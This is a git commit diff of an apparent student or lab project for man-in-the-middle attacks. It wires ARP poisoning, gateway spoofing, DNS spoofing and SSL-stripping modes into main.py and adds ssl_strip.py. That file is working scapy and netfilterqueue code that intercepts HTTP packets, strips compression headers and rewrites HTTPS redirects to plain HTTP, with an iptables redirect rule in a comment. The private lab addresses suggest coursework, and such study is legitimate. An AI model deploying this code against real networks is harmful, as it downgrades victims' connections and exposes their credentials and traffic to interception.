cd6641eec786d4c38800474042f82a7b510035c5
yy30537 <yang30537@gmail.com>
2023-06-08 00:27:59 +0200

    init

--- main.py
+++ main.py
@@ -2,7 +2,7 @@ import config
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
-#import ssl_strip
+import ssl_strip
 import sys
 
 def main():
@@ -11,18 +11,25 @@ def main():
 
     print("Interface: {}".format(interface))
 
-    
+    '''
+    macVictim = '08:00:27:CA:16-F1'
+    ipVictim = '10.0.2.5'
+    macServer = '08:00:27:5A:42:20'
+    ipServer = '10.0.2.4'
+    macAttacker = '08:00:27:0b:33:f8'
+    ipAttacker = '10.0.2.6'
+    '''
     macVictim = '08:00:27:B7:C4:AF'
     ipVictim = '192.168.56.101'
     macServer = '08:00:27:CC:08:6F'
     ipServer = '192.168.56.102'
     macAttacker = '08:00:27:D0:25:4B'
     ipAttacker = '192.168.56.103'
-
-    ipAttackerNetwork = '10.0.3.15'
-    ipVictimNetwork = '10.0.3.10'
-    ipGatewayNetwork = '10.0.3.2'
-
+    
+    ipVictimNetwork = '10.0.2.5' #'10.0.3.10'
+    ipGatewayNetwork = '10.0.2.4' #'10.0.3.2'
+    ipAttackerNetwork = '10.0.2.6' #'10.0.3.15'
+    
 
     print("Target IP (M1): {}".format(ipVictim))
     print("Target MAC (M1): {}\n".format(macVictim))
@@ -37,19 +44,22 @@ def main():
     if len(sys.argv) != 2:
         print("Usage: python main.py [arp|dns|ssl]")
         sys.exit(1)
-
     if sys.argv[1] == "arp":
         print("ARP Poisoning...")
         arp_poison.arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface)
-    elif sys.argv[1] == "dns":
-        print("DNS spoofing...")
-        dns_spoof.dns_spoof()
     elif sys.argv[1] == "arp_patient":
         arp_poison.arp_listener(macAttacker, interface)
     elif sys.argv[1] == "arp_gateway":
-        arp_mitm_gateway.gateway_spoof(ipGatewayNetwork, ipAttackerNetwork, ipVictimNetwork, interfaceNetwork)
-    #elif sys.argv[1] == "ssl":
-        #ssl_strip.start_strip(interface)
+        arp_mitm_gateway.gateway_spoof(ipGatewayNetwork, \
+                                       ipAttackerNetwork, \
+                                        ipVictimNetwork, \
+                                        interfaceNetwork)
+    elif sys.argv[1] == "dns":
+        print("DNS spoofing...")
+        dns_spoof.dns_spoof()
+    elif sys.argv[1] == "ssl":
+        print("SSL stripping...")
+        ssl_strip.ssl_strip(interface) # pass in interface or network interface?
     else:
         print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
         sys.exit(1)
---
+++ ssl_strip.py
@@ -0,0 +1,45 @@
+import netfilterqueue
+from scapy.all import *
+import re
+
+def process_packet(packet):
+    scapy_packet = IP(packet.get_payload())
+
+    if scapy_packet.haslayer(Raw):
+        load = scapy_packet[Raw].load.decode(errors="ignore")
+        if scapy_packet.haslayer(TCP):
+            if scapy_packet[TCP].dport == 80:
+                print("[+] Request")
+                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
+            elif scapy_packet[TCP].sport == 80:
+                print("[+] Response")
+                load = re.sub("Location: https://", "Location: http://", load)
+
+        if load != scapy_packet[Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(bytes(new_packet))
+
+    packet.accept()
+
+def set_load(packet, load):
+    packet[Raw].load = load
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[TCP].chksum
+    return packet
+
+def ssl_strip(interface):
+    queue = netfilterqueue.NetfilterQueue()
+    try:
+        queue.bind(0, process_packet)
+        queue.run()
+    except Exception as e:
+        print("Error: {}".format(e))
+        queue.unbind()
+
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# iptables --flush
+
+if __name__ == "__main__":
+    ssl_strip()
